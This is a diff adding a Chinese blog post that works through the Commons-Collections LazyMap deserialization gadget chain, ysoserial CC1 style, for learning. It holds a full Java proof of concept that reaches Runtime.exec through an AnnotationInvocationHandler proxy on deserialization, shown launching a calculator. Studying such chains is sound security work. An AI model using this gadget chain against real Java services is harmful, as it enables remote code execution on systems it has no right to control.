@@ -1,0 +1,595 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="reader-l">
+  <meta name="keywords" content="reader-l&#39;s blog">
+  <title>java安全-反序列化之利用LazyMap构造利用链 - reader-l&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.4.0/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"reader-l.github.io","root":"/","version":"1.8.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.3.0"><link rel="alternate" href="/atom.xml" title="reader-l's blog" type="application/atom+xml">
+</head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>reader-l's blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/Links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/List/">
+                <i class="iconfont icon-link-fill"></i>
+                List
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="java安全-反序列化之利用LazyMap构造利用链">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2020-10-21 19:16" pubdate>
+        2020年10月21日 晚上
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      1.5k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      21
+       分钟
+    </span>
+  
+
+  
+  
+    
+      <!-- 不蒜子统计文章PV -->
+      <span id="busuanzi_container_page_pv" style="display: none">
+        <i class="iconfont icon-eye" aria-hidden="true"></i>
+        <span id="busuanzi_value_page_pv"></span> 次
+      </span>
+    
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">java安全-反序列化之利用LazyMap构造利用链</h1>
+            
+              <p class="note note-info">
+                
+                  本文最后更新于：2021年5月13日 晚上
+                
+              </p>
+            
+            <div class="markdown-body">
+              <h1 id="1-前言"><a href="#1-前言" class="headerlink" title="1.前言"></a>1.前言</h1><p><strong>在<code>代码审计</code>的知识星球里，看到p神关于<code>java反序列化</code>系列的文章。于是跟着该系列文章进行学习。</strong></p>
+<p>这是跟这个系列学习的第三篇文章</p>
+<p>前面记录关于简化CommonCollections1利用链学习分析，我们都是用到了<code>TransformedMap</code>，但是我们在yso中的CommonCollections1利用链中用到的是<code>LazyMap</code>，因此这篇文章就是学习<code>LazyMap</code>，并用它来构造利用链。</p>
+<p><img src="/2020/10/21/java%E5%AE%89%E5%85%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%88%A9%E7%94%A8LazyMap%E6%9E%84%E9%80%A0%E5%88%A9%E7%94%A8%E9%93%BE/1.png" srcset="/img/loading.gif"></p>
+<h2 id="1-该利用链的限制条件："><a href="#1-该利用链的限制条件：" class="headerlink" title="1.该利用链的限制条件："></a>1.该利用链的限制条件：</h2><p>JDK版本：1.7 （8u71之后已修复不可利用）</p>
+<h1 id="2-学习记录"><a href="#2-学习记录" class="headerlink" title="2.学习记录"></a>2.学习记录</h1><h2 id="1-ysoserial中的LazyMap是啥"><a href="#1-ysoserial中的LazyMap是啥" class="headerlink" title="1.ysoserial中的LazyMap是啥"></a>1.ysoserial中的LazyMap是啥</h2><p><strong><code>LazyMap</code>和<code>TransformedMap</code>共同点：</strong></p>
+<p><code>LazyMap</code>和<code>TransformedMap</code>类似，都来自于Common-Collections库，并继承了<code>AbstractMapDecorator</code>。</p>
+<p><strong><code>LazyMap</code>和<code>TransformedMap</code>不同点：</strong></p>
+<p><code>TransformedMap</code>的漏洞触发点：是在利用<code>put</code>方法写入元素的时候触发了<code>transform</code>方法从而触发了我们构造的恶意利用链（具体看我之前写的文章<a href="https://reader-l.github.io/2020/10/14/java%E5%AE%89%E5%85%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E7%AE%80%E5%8C%96%E7%9A%84%E7%B1%BBCommonCollection1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/">java安全-反序列化之简化的类CommonCollection1利用链分析</a>）</p>
+<p><img src="/2020/10/21/java%E5%AE%89%E5%85%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%88%A9%E7%94%A8LazyMap%E6%9E%84%E9%80%A0%E5%88%A9%E7%94%A8%E9%93%BE/2.png" srcset="/img/loading.gif"></p>
+<p><img src="/2020/10/21/java%E5%AE%89%E5%85%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%88%A9%E7%94%A8LazyMap%E6%9E%84%E9%80%A0%E5%88%A9%E7%94%A8%E9%93%BE/3.png" srcset="/img/loading.gif"></p>
+<p>而<code>LazyMap</code>的漏洞触发点略有差别：<code>LazyMap</code>是在其<code>get</code>方法中执行的<code>factory.transform</code>。  当<code>map.containskey(key) == false</code>，就会调用<code>factory.transform</code>。</p>
+<p><img src="/2020/10/21/java%E5%AE%89%E5%85%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%88%A9%E7%94%A8LazyMap%E6%9E%84%E9%80%A0%E5%88%A9%E7%94%A8%E9%93%BE/4.png" srcset="/img/loading.gif"></p>
+<p>因此为了触发，我们需要找到一个类，其中有方法能够调用到<code>get</code>方法。</p>
+<p><code>ysoserial</code>的作者是利用<code>sun.reflect.annotation.AnnotationInvocationHandler</code>类的下的<code>invoke</code>方法来调用到<code>get</code>:</p>
+<p><img src="/2020/10/21/java%E5%AE%89%E5%85%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%88%A9%E7%94%A8LazyMap%E6%9E%84%E9%80%A0%E5%88%A9%E7%94%A8%E9%93%BE/5.png" srcset="/img/loading.gif"></p>
+<p>那要如何调用<code>invoke</code>方法呢？</p>
+<p><code>ysoserial</code>的作者是利用<code>java的对象代理</code>来调用<code>AnnotationInvocationHandler#invoke</code>。</p>
+<p>之前在学习java的动态代理的时候看过一片文章，讲述了<strong>java动态代理中的invoke方法是如何被自动调用的</strong></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/zcc_0015/article/details/22695647">https://blog.csdn.net/zcc_0015/article/details/22695647</a></p>
+<p>我想这应该是作者利用<code>java的对象代理</code>的原因吧</p>
+<h2 id="2-JAVA的对象代理的利用"><a href="#2-JAVA的对象代理的利用" class="headerlink" title="2.JAVA的对象代理的利用"></a>2.JAVA的对象代理的利用</h2><p>我们需要用到<code>java.reflect.Proxy</code>：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="hljs-keyword">new</span><br>Class[] &#123;Map.class&#125;, handler);<br></code></pre></td></tr></table></figure>
+<p><code>Proxy.newProxyInstance</code> 的第一个参数是<code>ClassLoader</code>，我们用默认的即可；第二个参数是我们需要代理的对象集合；第三个参数是一个实现了<code>InvocationHandler</code>接口的对象，里面包含了具体代理的逻辑。</p>
+<p><strong>p神的demo:</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> vulhub;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ExampleInvocationHandler</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">InvocationHandler</span> </span>&#123;<br>    <span class="hljs-keyword">protected</span> Map map;<br><br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span>  <span class="hljs-title">ExampleInvocationHandler</span><span class="hljs-params">(Map map)</span></span>&#123;<br>        <span class="hljs-keyword">this</span>.map = map;<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">invoke</span><span class="hljs-params">(Object proxy, Method method, Object[] args)</span> <span class="hljs-keyword">throws</span> Throwable </span>&#123;<br>        <span class="hljs-keyword">if</span>(method.getName().compareTo(<span class="hljs-string">&quot;get&quot;</span>) == <span class="hljs-number">0</span>)&#123;<br>            System.out.println(<span class="hljs-string">&quot;Hook method: &quot;</span>+ method.getName());<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;hacked Object&quot;</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> method.invoke(<span class="hljs-keyword">this</span>.map,args);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> vulhub;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ExampleTest</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        InvocationHandler handler = <span class="hljs-keyword">new</span> ExampleInvocationHandler(<span class="hljs-keyword">new</span> HashMap());<br>        Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="hljs-keyword">new</span> Class[] &#123;Map.class&#125;, handler);<br>        proxyMap.put(<span class="hljs-string">&quot;test&quot;</span>,<span class="hljs-string">&quot;xxx&quot;</span>);<br>        String result = (String)proxyMap.get(<span class="hljs-string">&quot;test&quot;</span>);<br>        System.out.println(result);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>
+<p>看执行结果，我们能发现我们明明传进<code>Map</code>是<code>test</code>值为<code>xxx</code>，但是我们获取到的结果却是<code>hacked Object</code></p>
+<p><img src="/2020/10/21/java%E5%AE%89%E5%85%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%88%A9%E7%94%A8LazyMap%E6%9E%84%E9%80%A0%E5%88%A9%E7%94%A8%E9%93%BE/6.png" srcset="/img/loading.gif"></p>
+<p><code>sun.reflect.annotation.AnnotationInvocationHandler </code>，这个类实际就是一个<code>InvocationHandler</code>，将这个对象用Proxy进行代理，那么在<code>readObject</code>的时候，只要调用任意的方法，就会自动调用到 <code>AnnotationInvocationHandler#invoke</code> 方法，进而触发我们的<code>LazyMap#get </code>。</p>
+<h2 id="3-利用LazyMap构造利用链"><a href="#3-利用LazyMap构造利用链" class="headerlink" title="3.利用LazyMap构造利用链"></a>3.利用<code>LazyMap</code>构造利用链</h2><p>在上一篇完善的简化的类<code>CommonsCollection1</code>的demo基础上进行修改。</p>
+<p>首先使用<code>LazyMap</code>替换<code>TransformedMap</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">Map outerMap = LazyMap.decorate(innerMap, transformerChain);<br></code></pre></td></tr></table></figure>
+<p>然后通过反射获取<code>sun.reflect.annotation.AnnotationInvocationHandler</code>这个内部类，然后进行对其进行<code>Proxy</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">Class clazz = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class);<br>construct.setAccessible(<span class="hljs-keyword">true</span>);<br>InvocationHandler handler = (InvocationHandler) construct.newInstance(Retention.class, outerMap);<br><br>Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="hljs-keyword">new</span> Class[] &#123;Map.class&#125;, handler);<br></code></pre></td></tr></table></figure>
+<p>代理后的对象叫做<code>proxyMap</code>，但我们不能直接对其进行序列化，因为我们反序列化的入口点是<code>sun.reflect.annotation.AnnotationInvocationHandler#readObject </code>，所以我们还需要再用<code>AnnotationInvocationHandler</code>对这个<code>proxyMap</code>进行包裹：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">handler = (InvocationHandler) construct.newInstance(Retention.class, proxyMap);<br></code></pre></td></tr></table></figure>
+<p>全部代码：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> vulhub;<br><br><span class="hljs-keyword">import</span> groovy.transform.Undefined;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.annotation.Retention;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ccTest2</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[] &#123;<br>            <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>            <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[] &#123; String.class, Class[].class &#125;, <span class="hljs-keyword">new</span> Object[] &#123; <span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> Class[<span class="hljs-number">0</span>] &#125;),<br>            <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> Class[] &#123; Object.class, Object[].class &#125;, <span class="hljs-keyword">new</span> Object[] &#123; <span class="hljs-keyword">null</span>, <span class="hljs-keyword">new</span> Object[<span class="hljs-number">0</span>] &#125;),<br>            <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> Class[] &#123; String.class &#125;, <span class="hljs-keyword">new</span> String[] &#123;<span class="hljs-string">&quot;deepin-calculator&quot;</span> &#125;),<br>        &#125;;<br><br>        Transformer transformerChain = <span class="hljs-keyword">new</span> ChainedTransformer(transformers);<br>        Map innerMap = <span class="hljs-keyword">new</span> HashMap();<br>        Map outerMap = LazyMap.decorate(innerMap, transformerChain);<br><br>        Class clazz = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class);<br>        construct.setAccessible(<span class="hljs-keyword">true</span>);<br>        <span class="hljs-comment">//利用newInstance进行AnnotationInvocationHandler类的实例化，由于在构造函数中利用范型规定来传入的Class类型必须要继承自注解(Annotation) 所以我们在newInstance需要传入注解，Poc里传入的是元注解(Retention.class)</span><br>        InvocationHandler handler = (InvocationHandler) construct.newInstance(Retention.class, outerMap);<br><br>        Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="hljs-keyword">new</span> Class[] &#123;Map.class&#125;, handler);<br>        <span class="hljs-comment">//利用newInstance进行AnnotationInvocationHandler类的实例化，由于在构造函数中利用范型规定来传入的Class类型必须要继承自注解(Annotation) 所以我们在newInstance需要传入注解，Poc里传入的是元注解(Retention.class)</span><br>        handler = (InvocationHandler) construct.newInstance(Retention.class, proxyMap);<br>        ByteArrayOutputStream barr = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(barr);<br>        oos.writeObject(handler);<br>        oos.close();<br>        System.out.println(barr);<br>        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(<span class="hljs-keyword">new</span> ByteArrayInputStream(barr.toByteArray()));<br>        Object o = (Object)ois.readObject();<br>    &#125;<br><br>&#125;<br><br></code></pre></td></tr></table></figure>
+<h2 id="4-小问题"><a href="#4-小问题" class="headerlink" title="4.小问题"></a>4.小问题</h2><p>当我用debug调试到了以下这句代码后：</p>
+<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">handler = (InvocationHandler) construct.<span class="hljs-keyword">new</span><span class="hljs-constructor">Instance(Retention.<span class="hljs-params">class</span>, <span class="hljs-params">proxyMap</span>)</span>;<br></code></pre></td></tr></table></figure>
+<p>会直接弹出三个计算器……..</p>
+<p><img src="/2020/10/21/java%E5%AE%89%E5%85%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%88%A9%E7%94%A8LazyMap%E6%9E%84%E9%80%A0%E5%88%A9%E7%94%A8%E9%93%BE/7.png" srcset="/img/loading.gif"></p>
+<p>引用p神的话：</p>
+<blockquote>
+<p>在使用Proxy代理了map对象后，我们在任何地方执行map的方法就会触发Payload弹出计算器，所以，在本地调试代码的时候，因为调试器会在下面调用一些toString之类的方法，导致不经意间触发了命令。ysoserial对此有一些处理，它在POC的最后才将执行命令的Transformer数组设置到transformerChain中，原因是避免本地生成序列化流的程序执行到命令（在调试程序的时候可能会触发一次Proxy#invoke </p>
+</blockquote>
+<p><img src="/2020/10/21/java%E5%AE%89%E5%85%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%88%A9%E7%94%A8LazyMap%E6%9E%84%E9%80%A0%E5%88%A9%E7%94%A8%E9%93%BE/8.png" srcset="/img/loading.gif"></p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/JAVA%E5%AE%89%E5%85%A8/">JAVA安全</a>
+                    
+                  </div>
+                
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2020/10/24/EDI%E5%86%85%E9%83%A8%E5%88%86%E4%BA%AB%E7%9F%A5%E8%AF%86%E7%82%B9%E6%94%B6%E5%BD%95/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">EDI内部分享知识点收录</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2020/10/16/Dubbo%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E4%B9%8BCVE-2019-17564%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/">
+                        <span class="hidden-mobile">Dubbo历史漏洞之CVE-2019-17564漏洞复现分析</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+              <!-- Comments -->
+              <article class="comments" id="comments">
+                
+                
+  <div id="vcomments"></div>
+  <script type="text/javascript">
+    Fluid.utils.waitElementVisible('vcomments', function() {
+      Fluid.utils.createScript('https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js', function () {
+        new Valine({
+          el: "#vcomments",
+          app_id: "r1aoO2CU8pztHBXDkQYFikuI-gzGzoHsz",
+          app_key: "dJhm8HsnHbHaA1BVeojBc6MI",
+          placeholder: "Just go go",
+          path: window.location.pathname,
+          avatar: "mm",
+          meta: ["nick","mail","link"],
+          pageSize: "10",
+          lang: "zh-CN",
+          highlight: false,
+          recordIP: false,
+          serverURLs: "",
+        });
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the
+    <a target="_blank" href="https://valine.js.org" rel="nofollow noopener noopener">comments powered by Valine.</a>
+  </noscript>
+
+
+              </article>
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
